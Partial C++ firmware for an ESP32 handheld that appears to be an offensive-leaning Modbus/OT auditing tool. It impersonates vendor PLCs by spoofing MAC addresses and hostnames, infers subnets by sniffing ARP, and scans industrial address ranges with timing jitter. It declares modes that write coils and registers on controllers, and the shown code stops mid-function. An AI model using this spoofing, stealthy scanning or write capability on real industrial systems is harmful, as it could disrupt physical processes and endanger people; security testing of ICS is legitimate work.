/*
 * MODBUS TCP AUDITOR TOOL
 * Copyright (C) 2026 z4y_d3n <https://github.com/z4y-d3n>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <M5StickCPlus2.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_netif.h> 
#include <SPI.h>
#include <Ethernet.h>
#include <utility/w5100.h> 
#include <vector>
#include <Preferences.h>
#include <WebServer.h>

// ==========================================
// 1. CONFIGURATION AND INTERFACES
// ==========================================
Preferences preferences;
WebServer server(80);
const char* AP_SSID = "M5-MODBUS-AUDITOR";
String storedSSID = ""; 
String storedPASS = ""; 
bool wifiConfigMode = false;

// W5500 SPI Pin Configuration
#define W5500_SCLK 0
#define W5500_MISO 36
#define W5500_MOSI 26
#define W5500_CS   32

const uint16_t COMMON_PORTS[10] = { 502, 5020, 802, 1502, 2000, 4001, 4002, 5000, 8080, 9600 };
int selectedPortIndex = 0; 

// ==========================================
// 2. GLOBAL OBJECTS AND MULTITASKING
// ==========================================
WiFiClient wClient;
EthernetClient eClient;
Client* netClient = &wClient;
bool useEthernet = false;

M5Canvas canvas(&M5.Lcd);
uint8_t targetUnitID = 1;        
uint16_t currentTransactionID = 0;

int savedProfileIdx = -1;

// --- L2 Network Engine Variables ---
uint32_t min_ip = 0xFFFFFFFF;
uint32_t max_ip = 0;

int arp_capturados = 0;
int cidr = 24;
IPAddress myIP, subnetMask, gateway, networkBase;

struct NetBlock { uint8_t b1, b2; };
const NetBlock mega_blocks[24] = {
    {192, 168}, {169, 254}, {172, 16}, {172, 17}, {172, 20}, {172, 30}, {172, 31},
    {10, 0}, {10, 1}, {10, 2}, {10, 10}, {10, 20}, {10, 50}, {10, 60}, {10, 80}, 
    {10, 99}, {10, 100}, {10, 110}, {10, 150}, {10, 200}, {10, 240}, {10, 250}, 
    {10, 254}, {10, 255}
};

// ==========================================
// 3. MAC/HOSTNAME SPOOFING PROFILES
// ==========================================
struct SpoofProfile { 
  const char* vendor; 
  const char* model;
  const char* host; 
  uint8_t oui[3]; 
};

const SpoofProfile profiles[] = {
  {"Siemens", "S7-1200 CPU", "s7-1200-station", {0x00, 0x1C, 0x06}},
  {"Siemens", "S7-1500 CPU", "plc-s7-1500",     {0x00, 0x0E, 0x8C}},
  {"Siemens", "LOGO! 8",     "logo8",           {0x00, 0x1C, 0x06}},
  {"Schneider", "Modicon M241", "m241-controller", {0x00, 0x80, 0xF4}},
  {"Schneider", "Modicon M580", "m580-cpu",        {0x00, 0x00, 0x54}},
  {"Rockwell", "ControlLogix", "1756-en2t",       {0x00, 0x00, 0xBC}},
  {"Rockwell", "CompactLogix", "compactlogix",    {0x00, 0x00, 0xBC}},
  {"Omron", "NX/NJ Series", "nx1p2-controller",  {0x00, 0x00, 0x0A}},
  {"Mitsubishi", "MELSEC", "melsec-q",          {0x00, 0x26, 0x92}},
  {"ABB", "AC800M", "ac800m",                  {0x00, 0x0A, 0x8F}},
  {"WAGO", "PFC200", "wago-pfc200",            {0x00, 0x30, 0xDE}},
  {"Default", "No Spoofing", "M5-AUDITOR",        {0xDE, 0xAD, 0xBE}}
};

const int totalProfiles = sizeof(profiles) / sizeof(profiles[0]);
const char* vendors[] = {"Siemens", "Schneider", "Rockwell", "Omron", "Mitsubishi", "ABB", "WAGO", "Default"};
const int numVendors = 8;
int selectedVendorIndex = 0;

uint8_t currentMac[6];
String currentHost = "";

// ==========================================
// 4. DATA STRUCTURES AND STATES
// ==========================================
enum AuditMode { 
  MODE_READ_COIL, MODE_WRITE_COIL_ON, MODE_WRITE_COIL_OFF, 
  MODE_READ_DISC_IN, MODE_READ_H_REG, MODE_WRITE_H_REG, MODE_READ_I_REG 
};

struct TargetHost { IPAddress ip; String status; };
std::vector<TargetHost> foundTargets; 
int selectedTargetIndex = 0;

enum AppState { 
  STATE_INTRO, STATE_SPOOF_LOAD, STATE_SPOOF_VENDOR, STATE_SPOOF_MODEL,  
  STATE_NET_SELECT, STATE_WIFI, STATE_ETH_INIT, STATE_INFER_SUBNET, STATE_AUTO_IP,
  STATE_WIFI_CONFIG, STATE_MAIN_MENU, STATE_PORT_SELECT, 
  STATE_SCANNING, STATE_SCAN_RESULT, STATE_TARGET_SELECT, STATE_TARGET_MENU, 
  STATE_AUDITOR_MENU, STATE_CONTROLLER, STATE_FINGERPRINT, STATE_UNIT_ID_SCAN, 
  STATE_EDIT_VALUE, STATE_FUZZER, STATE_WIFI_LOST 
};

AppState currentState = STATE_INTRO; 
AuditMode currentMode = MODE_READ_COIL;

int pageBase = 0; 
int addrOffset = 0; 
int lastReadValue = -1;
bool lastActionSuccess = false;
String statusMsg = "READY"; 
bool isAttacking = false; 
bool tiltBackward = false;
int globalWriteValue = 1234;

// --- OT Safety Mechanisms ---
bool isArmed = false;
unsigned long lastActivityTime = 0;
const unsigned long OT_SESSION_TIMEOUT = 60000; 

int menuIndex = 0;
int targetMenuPage = 0; 
int auditorMenuIndex = 0; 
int auditorMenuPage = 0;

#define TERM_GREEN  0x07E0
#define TERM_RED    0xF800
#define TERM_BLUE   0x001F
#define TERM_ORANGE 0xFD20
#define TERM_GRAY   0x7BEF
#define TERM_PURPLE 0x780F 

// ==========================================
// 5. FUNCTION PROTOTYPES AND NETWORK UTILS
// ==========================================
void showIntro();
void drawSpoofLoadMenu(); void drawSpoofVendorMenu(); 
void drawSpoofModelMenu(); void drawNetMenu(); void initEthernet(); 
void connectWiFi(); void setupAPAndServer(); void handleWebRoot(); 
void handleWebSave(); void drawMainMenu();
void selectPortScreen(); void scanNetwork(); bool verifyModbusService(IPAddress ip, uint16_t port); 
void drawBattery(M5Canvas *c, bool readHardware); void drawControllerUI(bool readBatHardware);
void drawWifiLostMenu();
void handleNavigation();
void executeAction(); void drawScanResults(); 
void drawTargetSelection(); void drawTargetMenu(); void drawAuditorMenu(); 
void executeFingerprint(); void executeUnitIDScan(); void executeFuzzer(); 
void drawValueEditor();
bool isWriteMode(AuditMode mode);
void runInferSubnet(); void runAutoIP();

// Debounced network validation to prevent false drops from SPI read errors
bool isNetworkConnected() { 
  if (useEthernet) {
      if (Ethernet.linkStatus() == LinkON) return true;
      delay(10);
      return Ethernet.linkStatus() == LinkON;
  }
  if (WiFi.status() == WL_CONNECTED) return true;
  delay(10);
  return WiFi.status() == WL_CONNECTED;
}

// ========================================================================
// NATIVE MACRAW AND PROMISCUOUS WIFI ENGINE
// ========================================================================
uint16_t w5500_macraw_recv(uint8_t* buf, uint16_t max_len) {
    uint16_t len = W5100.readSnRX_RSR(0);
    if (len == 0) return 0;
    
    uint16_t ptr = W5100.readSnRX_RD(0);
    uint16_t offset = ptr & W5100.SMASK;
    uint16_t srcAddr = offset + W5100.RBASE(0);
    
    uint8_t head[2];
    if (offset + 2 > W5100.SSIZE) {
        head[0] = W5100.read(srcAddr);
        head[1] = W5100.read(W5100.RBASE(0));
    } else { W5100.read(srcAddr, head, 2); }
    
    uint16_t data_len = (head[0] << 8) | head[1];
    if (data_len < 2) return 0; 
    
    uint16_t payload_len = data_len - 2;
    ptr += 2;
    offset = ptr & W5100.SMASK; srcAddr = offset + W5100.RBASE(0);
    uint16_t read_len = (payload_len > max_len) ? max_len : payload_len;
    
    if (offset + read_len > W5100.SSIZE) {
        uint16_t size = W5100.SSIZE - offset;
        W5100.read(srcAddr, buf, size); W5100.read(W5100.RBASE(0), buf + size, read_len - size);
    } else { W5100.read(srcAddr, buf, read_len); }
    
    ptr += payload_len; W5100.writeSnRX_RD(0, ptr); W5100.execCmdSn(0, (SockCMD)0x40); 
    return read_len;
}

void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return; 
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  for(int i = 0; i < len - 30; i++) {
    if(payload[i] == 0x08 && payload[i+1] == 0x06) { 
      uint32_t src = (payload[i+16]<<24) | (payload[i+17]<<16) | (payload[i+18]<<8) | payload[i+19];
      uint32_t dst = (payload[i+26]<<24) | (payload[i+27]<<16) | (payload[i+28]<<8) | payload[i+29];
      if(src > 0 && src < 0xE0000000) { if(src < min_ip) min_ip = src; if(src > max_ip) max_ip = src; }
      if(dst > 0 && dst < 0xE0000000) { if(dst < min_ip) min_ip = dst; if(dst > max_ip) max_ip = dst; }
      arp_capturados++; break;
    }
  }
}

bool check_hardware_target(uint8_t* target_ip) {
    if (Ethernet.linkStatus() != LinkON) return false;

    W5100.writeSnMR(0, 0x01); 
    W5100.writeSnPORT(0, random(10000, 60000));
    W5100.execCmdSn(0, (SockCMD)0x01);
    W5100.writeSnIR(0, 0xFF); 
    
    W5100.writeSnDIPR(0, target_ip); 
    W5100.writeSnDPORT(0, 502); 
    W5100.execCmdSn(0, (SockCMD)0x04);
    
    bool found = false; unsigned long st = millis();
    while(millis() - st < 40) { 
        uint8_t stat = W5100.readSnSR(0);
        uint8_t ir = W5100.readSnIR(0);
        if (ir & 0x01) { found = true; break; } 
        if (stat == 0x00 && !(ir & 0x08) && (millis() - st > 2)) { found = true; break; } 
    }
    W5100.execCmdSn(0, (SockCMD)0x10); return found;
}

bool isIpFreeActive(IPAddress candidate) {
    uint32_t mask_int = 0xFFFFFFFF << (32 - cidr);
    uint8_t sub[4] = {(uint8_t)(mask_int >> 24), (uint8_t)(mask_int >> 16), (uint8_t)(mask_int >> 8), (uint8_t)(mask_int & 0xFF)};
    uint32_t candInt = (candidate[0]<<24)|(candidate[1]<<16)|(candidate[2]<<8)|candidate[3];
    
    // Prevent IP collision with the broadcast address by flipping the least significant bit safely
    uint32_t tempInt = candInt ^ 2;
    uint8_t temp_ip[4] = {(uint8_t)(tempInt >> 24), (uint8_t)(tempInt >> 16), (uint8_t)(tempInt >> 8), (uint8_t)(tempInt & 0xFF)};
    
    W5100.writeSIPR(temp_ip); 
    W5100.writeSUBR(sub);
    uint8_t gw[4] = {candidate[0], candidate[1], candidate[2], 1};
    W5100.writeGAR(gw);
    
    uint8_t cand_arr[4] = {candidate[0], candidate[1], candidate[2], candidate[3]};
    return !check_hardware_target(cand_arr);
}

// ==========================================
// 6. MAIN SETUP
// ==========================================
void setup() {
  auto cfg = M5.config(); 
  M5.begin(cfg); 
  M5.Lcd.setRotation(3);
  M5.Lcd.setBrightness(48);

  wClient.setTimeout(1000);
  eClient.setTimeout(1000);
  
  preferences.begin("wifi_conf", false);
  storedSSID = preferences.getString("ssid", ""); 
  storedPASS = preferences.getString("pass", ""); 
  preferences.end();

  preferences.begin("spoof_cfg", false);
  savedProfileIdx = preferences.getInt("profile_idx", -1);
  if (savedProfileIdx >= 0 && savedProfileIdx < totalProfiles) {
      size_t macLen = preferences.getBytesLength("mac");
      if (macLen == 6) preferences.getBytes("mac", currentMac, 6);
      currentHost = preferences.getString("host", profiles[savedProfileIdx].host);
  } else {
      savedProfileIdx = -1;
  }
  preferences.end();
  
  canvas.createSprite(240, 135);
  M5.Lcd.fillScreen(TERM_RED); 
  M5.Speaker.tone(2000, 1000); 
  delay(1000);
  showIntro();
  
  if (savedProfileIdx >= 0 && savedProfileIdx < totalProfiles) currentState = STATE_SPOOF_LOAD;
  else currentState = STATE_SPOOF_VENDOR;
}

// ==========================================
// 7. MAIN LOOP (STATE MACHINE)
// ==========================================
void loop() {
  M5.update();
  if (currentState != STATE_INTRO && currentState != STATE_SPOOF_LOAD && 
      currentState != STATE_SPOOF_VENDOR && currentState != STATE_SPOOF_MODEL && 
      currentState != STATE_NET_SELECT && currentState != STATE_WIFI && 
      currentState != STATE_WIFI_LOST && currentState != STATE_WIFI_CONFIG && 
      currentState != STATE_ETH_INIT && currentState != STATE_INFER_SUBNET && 
      currentState != STATE_AUTO_IP) {
      
      if (!isNetworkConnected()) {
          delay(50);
          
          // Verify network drop to avoid false positives
          if (!isNetworkConnected()) {
              bool reconnected = false;
              canvas.fillScreen(BLACK);
              drawBattery(&canvas, true);
              canvas.setTextDatum(MC_DATUM); 
              canvas.setTextColor(TERM_ORANGE);
              canvas.drawString("NETWORK DROP DETECTED", 120, 50, 2);
              canvas.setTextColor(WHITE);
              canvas.drawString("Auto-reconnecting...", 120, 80, 2);
              canvas.pushSprite(0,0);
              
              // Force connection drop to prevent socket leaks
              if (netClient) netClient->stop();
              isAttacking = false;

              for(int i=0; i<4; i++) {
                  if(useEthernet) {
                      if(Ethernet.linkStatus() == LinkON) { reconnected = true; break; }
                      delay(1000);
                  } else {
                      WiFi.reconnect();
                      int timeout = 0;
                      while(WiFi.status() != WL_CONNECTED && timeout < 30) { delay(100); timeout++; }
                      if(WiFi.status() == WL_CONNECTED) { reconnected = true; break; }
                  }
               }
              if(!reconnected) {
                  currentState = STATE_WIFI_LOST;
              } else {
                  // Force redraw to clear UI artifacts
                  if (currentState == STATE_CONTROLLER) drawControllerUI(true);
                  else if (currentState == STATE_EDIT_VALUE) drawValueEditor();
                  else if (currentState == STATE_MAIN_MENU) drawMainMenu();
                  else if (currentState == STATE_TARGET_MENU) drawTargetMenu();
                  else if (currentState == STATE_AUDITOR_MENU) drawAuditorMenu();
              }
          }
      }
  }

  switch (currentState) {
    case STATE_SPOOF_LOAD: drawSpoofLoadMenu(); break;
    case STATE_SPOOF_VENDOR: drawSpoofVendorMenu(); break;
    case STATE_SPOOF_MODEL: drawSpoofModelMenu(); break;
    case STATE_NET_SELECT: drawNetMenu(); break;
    case STATE_ETH_INIT: initEthernet(); break;
    case STATE_WIFI: connectWiFi(); break;
    case STATE_INFER_SUBNET: runInferSubnet(); break;
    case STATE_AUTO_IP: runAutoIP(); break;
    case STATE_WIFI_CONFIG:
      server.handleClient();
      if (M5.BtnB.pressedFor(800)) {
          WiFi.softAPdisconnect(true); server.close(); WiFi.mode(WIFI_OFF);
          canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE);
          canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0);
          currentState = STATE_NET_SELECT;
          while(M5.BtnB.isPressed()) { M5.update(); yield(); }
          break;
      }
      static unsigned long lb = 0;
      if (millis() - lb > 1000) { lb = millis(); drawBattery(&canvas, true); canvas.pushSprite(0,0); } 
      break;
    case STATE_WIFI_LOST: drawWifiLostMenu(); break;
    case STATE_MAIN_MENU: drawMainMenu(); break;
    case STATE_PORT_SELECT: selectPortScreen(); break;
    case STATE_SCANNING: scanNetwork(); break;
    case STATE_SCAN_RESULT:
      drawScanResults();
      while (true) { 
        M5.update();
        if (M5.BtnB.pressedFor(800)) { 
          canvas.fillScreen(BLACK); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE); 
          canvas.drawString("RETURNING...", 120, 67, 2);
          canvas.pushSprite(0,0); 
          currentState = STATE_PORT_SELECT; 
          while(M5.BtnB.isPressed()) { M5.update(); yield(); }
          break;
        }
        if (M5.BtnB.wasReleased()) { 
          if (!foundTargets.empty()) { currentState = STATE_TARGET_SELECT; drawTargetSelection(); break; } 
          else { currentState = STATE_SCANNING; break; } 
        }
        yield();
      } 
      break;
    case STATE_TARGET_SELECT:
      if (M5.BtnA.wasClicked()) { 
        selectedTargetIndex++;
        if (selectedTargetIndex >= foundTargets.size()) selectedTargetIndex = 0; 
        drawTargetSelection(); 
      }
      if (M5.BtnB.pressedFor(800)) { 
        canvas.fillScreen(BLACK);
        canvas.setTextDatum(MC_DATUM); canvas.setTextColor(TERM_ORANGE); 
        canvas.drawString("RETURNING...", 120, 67, 2); canvas.pushSprite(0,0); 
        currentState = STATE_SCAN_RESULT; 
        while (M5.BtnB.isPressed()) { M5.update(); yield(); }
        drawScanResults(); return;
      }
      else if (M5.BtnB.wasReleased()) { 
        targetUnitID = 1;
        currentTransactionID = 0; currentState = STATE_TARGET_MENU; 
        menuIndex = 0; targetMenuPage = 0; 
      } 
      break;
    case STATE_TARGET_MENU: drawTargetMenu(); break;
    case STATE_AUDITOR_MENU: drawAuditorMenu(); break;
    case STATE_EDIT_VALUE: drawValueEditor(); break;
    case STATE_CONTROLLER: handleNavigation(); break;
    case STATE_FINGERPRINT: executeFingerprint(); break;
    case STATE_UNIT_ID_SCAN: executeUnitIDScan(); break;
    case STATE_FUZZER: executeFuzzer(); break;
    default: break;
  }
  delay(10);
}

bool isWriteMode(AuditMode mode) { 
  return (mode == MODE_WRITE_COIL_ON || mode == MODE_WRITE_COIL_OFF || mode == MODE_WRITE_H_REG);
}

// ==========================================
// 8. MILITARY-GRADE NETWORK FUNCTIONS
// ==========================================
void runInferSubnet() {
  min_ip = 0xFFFFFFFF;
  max_ip = 0;
  arp_capturados = 0;
  bool active_gw_found = false;
  const int PASSIVE_TIME_MS = 60000; 
  int last_sec_ui = -1;
  
  if (!useEthernet) {
    canvas.fillScreen(BLACK); canvas.setTextColor(TERM_ORANGE);
    canvas.drawString("PASSIVE WIFI ONLY", 120, 30, 2); canvas.setTextColor(WHITE); 
    canvas.pushSprite(0,0);
    
    uint32_t start_listen = millis();
    esp_wifi_set_promiscuous(true); esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
    
    while (millis() - start_listen < PASSIVE_TIME_MS) { 
        M5.update();
        int sec_left = (PASSIVE_TIME_MS - (millis() - start_listen)) / 1000;
        if (sec_left != last_sec_ui) {
            canvas.fillRect(0, 60, 240, 40, BLACK);
            canvas.setTextDatum(MC_DATUM);
            canvas.setTextColor(WHITE); canvas.drawString("Listening...", 120, 70, 2);
            
            // Memory safe string formatting
            char timeBuf[32];
            snprintf(timeBuf, sizeof(timeBuf), "Time left: %ds", sec_left);
            canvas.setTextColor(TERM_GRAY); canvas.drawString(timeBuf, 120, 90, 2);
            drawBattery(&canvas, true);
            canvas.pushSprite(0,0);
            last_sec_ui = sec_left;
        }

        delay(10);
        if (arp_capturados >= 2) {
            int temp_cidr = __builtin_clz(min_ip ^ max_ip);
            if (temp_cidr <= 16) break; 
        }
    } 
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    
    if (arp_capturados >= 2) {
      cidr = __builtin_clz(min_ip ^ max_ip);
      if (cidr < 8 || cidr > 30) cidr = 24; 
      uint32_t mask_int = 0xFFFFFFFF << (32 - cidr);
      uint32_t net_int = min_ip & mask_int; 
      networkBase = IPAddress(net_int >> 24, (net_int >> 16) & 0xFF, (net_int >> 8) & 0xFF, net_int & 0xFF);
    } else { 
      cidr = 24; networkBase = IPAddress(192, 168, 1, 0);
    }
  } else {
    canvas.fillScreen(BLACK); canvas.setTextColor(TERM_ORANGE); canvas.setTextDatum(MC_DATUM);
    canvas.drawString("PHASE 1: L2 MACRAW", 120, 30, 2); canvas.pushSprite(0,0);
    
    W5100.writeSnMR(0, 0x04); W5100.execCmdSn(0, (SockCMD)0x01); 
    uint32_t start_macraw = millis();
    while(millis() - start_macraw < PASSIVE_TIME_MS) {
        M5.update();
        int sec_left = (PASSIVE_TIME_MS - (millis() - start_macraw)) / 1000;
        if (sec_left != last_sec_ui) {
            canvas.fillRect(0, 60, 240, 40, BLACK);
            canvas.setTextDatum(MC_DATUM);
            canvas.setTextColor(WHITE); canvas.drawString("Listening...", 120, 70, 2);
            
            // Memory safe string formatting
            char timeBuf[32];
            snprintf(timeBuf, sizeof(timeBuf), "Time left: %ds", sec_left);
            canvas.setTextColor(TERM_GRAY); canvas.drawString(timeBuf, 120, 90, 2);
            drawBattery(&canvas, true);
            canvas.pushSprite(0,0);
            last_sec_ui = sec_left;
        }
        
        uint8_t eth_buf[128];
        uint16_t r_len = w5500_macraw_recv(eth_buf, 128); 
        
        if (r_len >= 42 && eth_buf[12] == 0x08 && eth_buf[13] == 0x06) {
            uint32_t src = (eth_buf[28]<<24) | (eth_buf[29]<<16) | (eth_buf[30]<<8) | eth_buf[31];
            uint32_t dst = (eth_buf[38]<<24) | (eth_buf[39]<<16) | (eth_buf[40]<<8) | eth_buf[41];
            
            if(src > 0 && src < 0xE0000000) { if(src < min_ip) min_ip = src; if(src > max_ip) max_ip = src; }
            if(dst > 0 && dst < 0xE0000000) { if(dst < min_ip) min_ip = dst; if(dst > max_ip) max_ip = dst; }
            arp_capturados++;
            
            if (arp_capturados >= 2) {
                int temp_cidr = __builtin_clz(min_ip ^ max_ip);
                if (temp_cidr <= 16) break;
            }
        }
    }
    W5100.execCmdSn(0, (SockCMD)0x10);
    
    if (arp_capturados >= 2) {
        cidr = __builtin_clz(min_ip ^ max_ip);
        if (cidr < 8 || cidr > 30) cidr = 24; 
        uint32_t mask_int = 0xFFFFFFFF << (32 - cidr);
        uint32_t net_int = min_ip & mask_int; 
        networkBase = IPAddress(net_int >> 24, (net_int >> 16) & 0xFF, (net_int >> 8) & 0xFF, net_int & 0xFF);
        active_gw_found = true;
    } 

    if (!active_gw_found) {
        canvas.fillScreen(BLACK); canvas.setTextColor(CYAN);
        canvas.setTextDatum(MC_DATUM);
        canvas.drawString("PHASE 2: ACTIVE", 120, 30, 2);
        canvas.setTextColor(WHITE); canvas.drawString("6.144 OT Subnets", 120, 55, 2); 
        canvas.pushSprite(0,0);
        
        int total_subnets = 24 * 256; 
        int total_est_sec = 614; 
        uint32_t start_active = millis();
        uint32_t last_ui_update = 0;
        
        uint8_t sn_mask[4] = {255, 255, 255, 0};
        uint8_t target_ends[8] = {1, 10, 20, 50, 100, 200, 250, 254};
        
        for (int i = 0; i < total_subnets; i++) {
            M5.update();
            if (M5.BtnB.isPressed()) break; 
            
            if (millis() - last_ui_update > 500) {
                int current_block = (i / 256) + 1;
                int elapsed_sec = (millis() - start_active) / 1000;
                int sec_left = total_est_sec - elapsed_sec;
                if (sec_left < 0) sec_left = 0;

                canvas.fillRect(0, 80, 240, 40, BLACK); canvas.setTextDatum(MC_DATUM);
                canvas.setTextColor(TERM_GRAY);
                
                // Memory safe string formatting
                char blockBuf[32];
                snprintf(blockBuf, sizeof(blockBuf), "Scanning Block %d/24", current_block);
                canvas.drawString(blockBuf, 120, 90, 2);
                
                char timeBuf[32];
                snprintf(timeBuf, sizeof(timeBuf), "Time left: %ds", sec_left);
                canvas.drawString(timeBuf, 120, 110, 2);
                
                drawBattery(&canvas, true);
                canvas.pushSprite(0,0); 
                last_ui_update = millis();
            }

            int block_idx = i / 256;
            int b3_val = i % 256;

            uint8_t spoof_ip[4] = {mega_blocks[block_idx].b1, mega_blocks[block_idx].b2, (uint8_t)b3_val, 222};
            W5100.writeSIPR(spoof_ip); W5100.writeSUBR(sn_mask);
            
            for (int s = 0; s < 8; s++) {
                uint8_t t_ip[4] = {mega_blocks[block_idx].b1, mega_blocks[block_idx].b2, (uint8_t)b3_val, target_ends[s]};
                W5100.writeSnMR(s, 0x01); W5100.writeSnPORT(s, random(10000, 60000)); W5100.execCmdSn(s, (SockCMD)0x01); 
                W5100.writeSnIR(s, 0xFF); W5100.writeSnDIPR(s, t_ip); W5100.writeSnDPORT(s, 502);
                W5100.execCmdSn(s, (SockCMD)0x04);
            }

            unsigned long st = millis();
            while(millis() - st < 100) {
                for(int s = 0; s < 8; s++) {
                    uint8_t ir = W5100.readSnIR(s);
                    uint8_t sr = W5100.readSnSR(s);
                    
                    if ((ir & 0x01) || (sr == 0x00 && !(ir & 0x08) && (millis() - st > 3))) { 
                        
                        active_gw_found = true;
                        uint8_t wide_mask[4] = {255, 255, 0, 0};
                        W5100.writeSUBR(wide_mask);

                        int test_offsets[] = {1, 3, 7, 15, 31, 63, 127, 255};
                        uint32_t original_base_int = (mega_blocks[block_idx].b1 << 24) | (mega_blocks[block_idx].b2 << 16) | (b3_val << 8);
                        uint32_t max_found_ip = original_base_int;
                        
                        for (int k = 0; k < 8; k++) {
                            if (b3_val + test_offsets[k] > 255) break;
                            uint8_t probe_ip[4] = { mega_blocks[block_idx].b1, mega_blocks[block_idx].b2, (uint8_t)(b3_val + test_offsets[k]), 1 };
                            if (check_hardware_target(probe_ip)) {
                                max_found_ip = (probe_ip[0] << 24) | (probe_ip[1] << 16) | (probe_ip[2] << 8) | probe_ip[3];
                            } else {
                                break;
                            }
                        }

                        if (max_found_ip != original_base_int) {
                           cidr = __builtin_clz(original_base_int ^ max_found_ip);
                           if (cidr > 24) cidr = 24; 
                        } else {
                            cidr = 24;
                        }

                        uint32_t mask = 0xFFFFFFFF << (32 - cidr);
                        uint32_t netInt = original_base_int & mask;
                        networkBase = IPAddress(netInt >> 24, (netInt >> 16) & 0xFF, (netInt >> 8) & 0xFF, 0);
                        break; 
                    }
                }
                if(active_gw_found) break;
            }
            for(int s = 0; s < 8; s++) W5100.execCmdSn(s, (SockCMD)0x10);
            
            // Break main subnet scanning loop if gateway is found
            if (active_gw_found) break; 
        }
        if(!active_gw_found) { cidr = 24; networkBase = IPAddress(192, 168, 1, 0); }
    }
  }

  uint32_t mask_int = 0xFFFFFFFF << (32 - cidr);
  subnetMask = IPAddress(mask_int >> 24, (mask_int >> 16) & 0xFF, (mask_int >> 8) & 0xFF, mask_int & 0xFF);
  gateway = IPAddress(networkBase[0], networkBase[1], networkBase[2], networkBase[3] + 1);
  currentState = STATE_AUTO_IP;
}

void runAutoIP() {
  bool ipFound = false; netClient->setTimeout(30);
  while (!ipFound) {
    uint32_t offset = random(2, (1 << (32 - cidr)) - 2);
    uint32_t netInt = (networkBase[0]<<24)|(networkBase[1]<<16)|(networkBase[2]<<8)|networkBase[3];
    uint32_t candInt = netInt + offset;
    IPAddress candidate(candInt >> 24, (candInt >> 16) & 0xFF, (candInt >> 8) & 0xFF, candInt & 0xFF);

    canvas.fillScreen(BLACK); canvas.setTextColor(TERM_ORANGE); canvas.setTextDatum(MC_DATUM);
    canvas.drawString("GARP COLLISION CHECK", 120, 30, 2);
    
    // Memory safe string formatting
    char candBuf[32];
    snprintf(candBuf, sizeof(candBuf), "Probing: %d.%d.%d.%d", candidate[0], candidate[1], candidate[2], candidate[3]);
    canvas.setTextColor(WHITE); canvas.drawString(candBuf, 120, 70, 2); 
    
    drawBattery(&canvas, true);
    canvas.pushSprite(0,0);
    
    if (useEthernet) {
        if(isIpFreeActive(candidate)) {
            Ethernet.begin(currentMac, candidate, gateway, gateway, subnetMask);
            myIP = candidate; ipFound = true;
        }
    } else {
        WiFi.config(candidate, gateway, subnetMask);
        if (netClient->connect(candidate, 502)) { netClient->stop(); delay(10); } 
        else { myIP = candidate; ipFound = true; }
    }
  }
  
  canvas.fillScreen(BLACK); canvas.setTextColor(TERM_GREEN); canvas.setTextDatum(MC_DATUM);
  canvas.drawString("IP AUTO-ASSIGNED", 120, 40, 2);
  
  char finalIpBuf[32];
  snprintf(finalIpBuf, sizeof(finalIpBuf), "%d.%d.%d.%d /%d", myIP[0], myIP[1], myIP[2], myIP[3], cidr);
  canvas.setTextColor(WHITE);
  canvas.drawString(finalIpBuf, 120, 80, 2); 
  
  drawBattery(&canvas, true);
  canvas.pushSprite(0,0);
  delay(2500);
  currentState = STATE_MAIN_MENU;
}

void scanNetwork() {
  canvas.fillScreen(BLACK);
  drawBattery(&canvas, true);
  canvas.setTextDatum(TC_DATUM);
  canvas.setTextColor(TERM_GRAY);
  
  // Memory safe string formatting
  char scanTitle[64];
  snprintf(scanTitle, sizeof(scanTitle), "SCAN: %d.%d.%d.x [/%d]", networkBase[0], networkBase[1], networkBase[2], cidr);
  canvas.drawString(scanTitle, 120, 5, 2);
  
  uint32_t netInt = (networkBase[0]<<24)|(networkBase[1]<<16)|(networkBase[2]<<8)|networkBase[3];
  uint32_t maxHosts = (1 << (32 - cidr)) - 2;

  uint32_t step = (maxHosts <= 254) ? 149 : ((maxHosts <= 2046) ? 401 : ((maxHosts <= 8190) ? 2011 : ((maxHosts <= 32766) ? 7001 : ((maxHosts <= 65534) ? 30011 : 1))));
  uint32_t offsetVal = esp_random() % maxHosts;
  if (offsetVal == 0) offsetVal = maxHosts;

  uint32_t scannedCount = 0;
  int hostsCount = 0;
  bool abortScan = false;
  uint16_t targetPort = COMMON_PORTS[selectedPortIndex];

  foundTargets.clear();
  selectedTargetIndex = 0;
  
  if (useEthernet) {
    Ethernet.setRetransmissionTimeout(150); Ethernet.setRetransmissionCount(2);
    uint32_t socketTargetIP[8] = {0};
    unsigned long socketStartTime[8] = {0};
    uint32_t last_ui_update = 0;

    while (scannedCount < maxHosts && hostsCount < 10) {
      M5.update();
      if (M5.BtnB.pressedFor(800)) {
          canvas.fillScreen(BLACK);
          drawBattery(&canvas, true); canvas.setTextDatum(MC_DATUM);
          canvas.setTextColor(TERM_RED);
          canvas.drawString("STOPPING IPs SCANNING...", 120, 67, 2);
          canvas.pushSprite(0,0);
          for (int k=0; k<7; k++) W5100.execCmdSn(k, (SockCMD)0x10);
          while(M5.BtnB.isPressed()) { M5.update(); yield(); }
          abortScan = true; break;
      }

      for (int s = 0; s < 7; s++) {
        uint8_t stat = W5100.readSnSR(s);
        if (stat == 0x00) {
          if (scannedCount < maxHosts) {
            uint32_t currentOffset = offsetVal;
            offsetVal = (offsetVal + step) % maxHosts;
            if (offsetVal == 0) offsetVal = maxHosts;
            scannedCount++;
            
            uint32_t targetInt = netInt + currentOffset;
            IPAddress tIP(targetInt>>24, (targetInt>>16)&0xFF, (targetInt>>8)&0xFF, targetInt&0xFF);

            int jitter = 10 + (esp_random() % 30);
            delay(jitter);
            
            if (millis() - last_ui_update > 200) {
